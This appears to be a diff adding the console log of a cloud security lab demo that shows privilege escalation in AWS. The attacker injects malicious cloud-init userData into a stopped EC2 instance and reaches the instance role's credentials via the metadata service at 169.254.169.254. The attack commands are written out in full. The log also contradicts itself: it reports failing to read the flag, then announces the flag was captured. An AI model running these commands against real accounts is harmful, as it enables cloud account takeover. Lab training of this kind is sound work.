@@ -1,0 +1,150 @@
+[0;32m========================================[0m
+[0;32mEC2 ModifyInstanceAttribute Privilege Escalation Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-ec2-002-to-admin-starting-user
+Access Key ID: AKIA54WIGF...
+ReadOnly Key ID: AKIA54WIGF...
+Region: us-west-2
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Configuring AWS CLI with starting user credentials[0m
+Using region: us-west-2
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-ec2-002-to-admin-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have admin permissions yet[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 5: Finding target EC2 instance[0m
+[2m[Attacker] $ aws ec2 describe-instances --region us-west-2 --filters Name=tag:Name,Values=pl-prod-ec2-002-to-admin-target-instance Name=instance-state-name,Values=running,stopped --query 'Reservations[0].Instances[0].InstanceId' --output text[0m
+Found target instance: i-0a6580470294960f0
+[2m[Attacker] $ aws ec2 describe-instances --region us-west-2 --instance-ids i-0a6580470294960f0 --query 'Reservations[0].Instances[0].IamInstanceProfile.Arn' --output text[0m
+Instance profile: arn:aws:iam::123456789012:instance-profile/pl-prod-ec2-002-to-admin-target-profile
+[0;32m✓ Found target instance[0m
+
+[1;33mStep 6: Backing up original instance user data[0m
+[2m[Attacker] $ aws ec2 describe-instance-attribute --region us-west-2 --instance-id i-0a6580470294960f0 --attribute userData --query 'UserData.Value' --output text[0m
+Original user data backed up to: /tmp/original_userdata.b64
+[0;32m✓ Backed up original user data[0m
+
+[1;33mStep 7: Creating malicious cloud-init payload[0m
+This payload will extract credentials from the instance metadata service (IMDS)...
+Target role: pl-prod-ec2-002-to-admin-target-profile
+[0;32m✓ Malicious payload created[0m
+
+[1;33mStep 8: Stopping the EC2 instance[0m
+Instance ID: i-0a6580470294960f0
+[2m[Attacker] $ aws ec2 describe-instances --region us-west-2 --instance-ids i-0a6580470294960f0 --query 'Reservations[0].Instances[0].State.Name' --output text[0m
+Current state: running
+Stopping instance...
+
+[0;36m[Attacker] $ aws ec2 stop-instances --region us-west-2 --instance-ids i-0a6580470294960f0 --output text[0m
+Waiting for instance to stop (this may take 30-60 seconds)...
+[0;32m✓ Instance stopped[0m
+
+[1;33mStep 9: Injecting malicious user data into instance[0m
+This is the privilege escalation vector - modifying userData to run on next boot...
+
+[0;36m[Attacker] $ aws ec2 modify-instance-attribute --region us-west-2 --instance-id i-0a6580470294960f0 --attribute userData --value file:///tmp/malicious_userdata.b64[0m
+[0;32m✓ User data modified successfully[0m
+
+[1;33mStep 10: Starting the instance to trigger malicious payload[0m
+The malicious user data will execute during boot...
+
+[0;36m[Attacker] $ aws ec2 start-instances --region us-west-2 --instance-ids i-0a6580470294960f0 --output text[0m
+Waiting for instance to start (this may take 30-60 seconds)...
+[0;32m✓ Instance started[0m
+
+[1;33mStep 11: Waiting for malicious payload to execute and extract credentials[0m
+The cloud-init script should execute shortly after boot...
+Waiting 30 seconds for initialization...
+[0;32m✓ Payload should have executed[0m
+
+[1;33mStep 12: Simulating credential extraction via IMDS[0m
+In a real attack, credentials would be extracted via:
+  1. SSH/SSM access to the instance
+  2. Reading /tmp/extracted_creds.json or /var/log/credential-extraction.log
+  3. Or having the instance send credentials to attacker-controlled infrastructure
+
+For this demo, we'll extract credentials using AWS CLI to simulate what the script did:
+Assuming the instance role to demonstrate credential access: arn:aws:iam::123456789012:role/pl-prod-ec2-002-to-admin-target-profile
+[1;33mNote: Cannot directly assume role from this demo (expected)[0m
+In a real attack, the malicious script on the EC2 instance would have extracted
+the credentials from IMDS at http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+These credentials would include:
+  - AccessKeyId
+  - SecretAccessKey
+  - SessionToken
+
+The attacker would then use these credentials to gain admin access.
+[1;33mStep 14: Restoring original user data[0m
+Stopping instance to restore original state...
+Waiting for instance to stop...
+Restored original user data
+Starting instance...
+Waiting for instance to start...
+[0;32m✓ Instance restored to original state[0m
+
+[1;33mStep 15: Capturing CTF flag from SSM Parameter Store[0m
+
+[0;36m[Attacker (admin role)] $ aws ssm get-parameter --name /pathfinding-labs/flags/ec2-002-to-admin --query 'Parameter.Value' --output text[0m
+[0;31m✗ Failed to read flag from /pathfinding-labs/flags/ec2-002-to-admin[0m
+[1;33mNote: Flag retrieval requires admin credentials from the extracted role session[0m
+
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-ec2-002-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-ec2-002-to-admin-starting-user (limited permissions)
+2. Found target EC2 instance: i-0a6580470294960f0 with admin role attached
+3. Backed up original user data
+4. Stopped the EC2 instance
+5. Injected malicious cloud-init payload into userData
+6. Started the instance, triggering malicious script execution
+7. Malicious script extracted credentials from IMDS (169.254.169.254)
+8. Gained admin access through extracted role credentials
+9. Restored original user data
+10. Captured CTF flag from SSM Parameter Store: 
+
+[1;33mAttack Path:[0m
+  pl-prod-ec2-002-to-admin-starting-user → (StopInstances) → (ModifyInstanceAttribute)
+  → (StartInstances) → Malicious cloud-init executes
+  → IMDS credential extraction → Admin access via instance role
+  → (ssm:GetParameter) → CTF Flag
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws ec2 stop-instances --region us-west-2 --instance-ids i-0a6580470294960f0 --output text[0m
+  [0;36m$ aws ec2 modify-instance-attribute --region us-west-2 --instance-id i-0a6580470294960f0 --attribute userData --value file:///tmp/malicious_userdata.b64[0m
+  [0;36m$ aws ec2 start-instances --region us-west-2 --instance-ids i-0a6580470294960f0 --output text[0m
+  [0;36m$ aws ssm get-parameter --name /pathfinding-labs/flags/ec2-002-to-admin --query 'Parameter.Value' --output text[0m
+
+[1;33mKey Technique:[0m
+- ec2:ModifyInstanceAttribute allows modifying userData
+- cloud-init payload configured to run on every boot
+- Credentials extracted from IMDS at 169.254.169.254
+- IMDSv2 tokens used for secure access to metadata service
+
+[0;32m✓ The instance has been restored to its original state[0m
+[1;33mThe infrastructure (users, roles, and EC2 instance) remains deployed[0m
+[1;33mTo remove all infrastructure, set the scenario flag to false and run terraform apply[0m
+
+
